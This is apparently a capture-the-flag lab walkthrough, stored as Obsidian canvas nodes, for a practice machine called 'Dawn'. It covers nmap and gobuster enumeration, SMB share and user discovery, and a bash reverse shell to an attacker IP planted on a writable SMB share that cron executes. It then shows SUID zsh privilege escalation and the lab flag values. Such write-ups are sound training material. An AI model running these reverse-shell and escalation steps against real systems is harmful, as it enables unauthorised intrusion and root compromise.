		{"id":"2575132fd7b8c877","type":"text","text":"# TARGET","x":-143,"y":-165,"width":250,"height":60},
		{"id":"42ab919a38d6b7d5","type":"text","text":"## nmap\n```\nPORT     STATE SERVICE     VERSION\n80/tcp   open  http        Apache httpd 2.4.38 ((Debian))\n| http-methods: \n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.38 (Debian)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\n3306/tcp open  mysql       MariaDB 5.5.5-10.3.15\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.5.5-10.3.15-MariaDB-1\n|   Thread ID: 14\n|   Capabilities flags: 63486\n|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, ODBCClient, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: i-CH~e_,]m1FP=#3uul=\n|_  Auth Plugin Name: mysql_native_password\nService Info: Host: DAWN\n\nHost script results:\n| smb2-time: \n|   date: 2026-07-24T12:42:23\n|_  start_date: N/A\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.9.5-Debian)\n|   Computer name: dawn\n|   NetBIOS computer name: DAWN\\x00\n|   Domain name: dawn\n|   FQDN: dawn.dawn\n|_  System time: 2026-07-24T08:42:25-04:00\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 1h20m54s, deviation: 2h18m34s, median: 53s\n\n```","x":-780,"y":-20,"width":653,"height":1280},
		{"id":"b6768c92cece5aa2","type":"text","text":"port 139","x":340,"y":-210,"width":250,"height":60},
		{"id":"5ab154aa43086928","type":"text","text":"port 445","x":340,"y":-125,"width":250,"height":60},
		{"id":"5a6097a119df6f2c","type":"text","text":"port 3306","x":340,"y":-45,"width":250,"height":60},
		{"id":"3f1c66f2b5759152","type":"text","text":"port 80","x":340,"y":-300,"width":250,"height":60},
		{"id":"272d0466360e1330","type":"text","text":"# 2. Web Enumeration\n\n```\ngobuster dir -u http://192.168.139.11 \\\n  -w /usr/share/wordlists/dirb/big.txt\n```\n\nFound:\n- `/cctv/` → 403 Forbidden\n- `/logs/` → 301, directory listing enabled\n\nInside `/logs/`:\n- auth.log (empty)\n- daemon.log (empty)\n- error.log (empty)\n- **management.log (81K)** ← key file","x":960,"y":160,"width":420,"height":440,"color":"4"},
		{"id":"0dffbb2426f991f6","type":"text","text":"# 4. SMB Enumeration\n\n```\nsmbclient -L //192.168.139.11/ -N\n```\n\nShares found:\n- print$ — Printer Drivers\n- **ITDEPT** — \"PLEASE DO NOT REMOVE\" (writable, world r/w — drwsrwsrwx)\n- IPC$\n\nRID cycling (enum4linux/rpcclient) revealed local users:\n- `dawn` (uid 1000)\n- `ganimedes`","x":960,"y":640,"width":420,"height":440,"color":"4"},
		{"id":"4c6363ba8b4ff00e","type":"text","text":"# 1. Nmap Recon\n\n```\nnmap -sC -sV -p- 192.168.139.11\n```\n\nKey findings:\n- Guest SMB access likely enabled\n- MySQL open but held in reserve (no creds yet)\n- Web server title blank — needs manual enum","x":300,"y":480,"width":420,"height":280,"color":"4"},
		{"id":"8506ced8b884b185","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260724175100.png","x":1000,"y":-232,"width":500,"height":308},
		{"id":"5dfec96079a324ce","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260724174459.png","x":1000,"y":-582,"width":533,"height":312},
		{"id":"03797e012ced4bf2","type":"text","text":"# 5. Exploitation — Writable SMB + Cron\n\nCreated reverse shell payloads:\n\n```bash\ncat << 'EOF' > web-control\n#!/bin/bash\nbash -i >& /dev/tcp/192.168.45.185/3030 0>&1\nEOF\ncp web-control product-control\nchmod +x web-control product-control\n```\n\nUploaded to writable share:\n```\nsmbclient -N //192.168.139.11/ITDEPT\nput web-control\nput product-control\n```\n\nListener:\n```\nnc -nlvp 3030\n```\n\n**Result:** cron job executed the dropped script → reverse shell as `dawn`","x":1660,"y":260,"width":420,"height":720,"color":"2"},
		{"id":"5b810646937e4674","type":"text","text":"# 6. Initial Foothold\n\nCaught shell as `dawn`:\n```\nuid=1000(dawn) gid=1000(dawn)\n```\n\nUpgraded TTY:\n```\npython -c \"import pty; pty.spawn('/bin/bash')\"\nexport TERM=xterm\n```\n\n**local.txt flag:**\n```\ndc886c8a7994b9031abc333da5dec383\n```","x":2280,"y":160,"width":380,"height":460,"color":"1"},
		{"id":"4cc887216cd09b9b","type":"text","text":"# 8. Root Flags\n\n```\nwhoami\nroot\n```\n\n**proof.txt:**\n```\n79310d891ec739bdb5a6364f1b430176\n```\n\n**/root/flag.txt** also present (root.txt equivalent) — grab with:\n```\ncat /root/flag.txt\n```","x":2780,"y":160,"width":380,"height":400,"color":"6"},
		{"id":"5a4c180a0efb104a","type":"text","text":"# 7. Privilege Escalation\n\nEnumerated SUID binaries:\n```\nfind / -type f -perm /4000 2>/dev/null\n```\n\nFound `/usr/bin/zsh` with SUID bit set.\n\nExploited via GTFOBins zsh SUID technique:\n```\nzsh\n```\n\n→ dropped into **root** shell directly (SUID zsh preserves EUID).","x":2260,"y":720,"width":420,"height":420,"color":"1"},
		{"id":"56f4f1cd3757ab20","type":"text","text":"# Lessons / Takeaways\n\n- Blank/near-empty log files can hide one large, information-rich file worth targeting (`management.log`).\n- World-writable SMB shares combined with cron jobs = classic root-via-cron primitive.\n- Always check SUID binaries after gaining any foothold — GTFOBins-listed SUID interpreters (zsh, python, etc.) are an instant root path.\n- RID cycling on SMB (null session) is a reliable way to enumerate local usernames pre-auth.","x":2780,"y":680,"width":620,"height":300,"color":"6"},
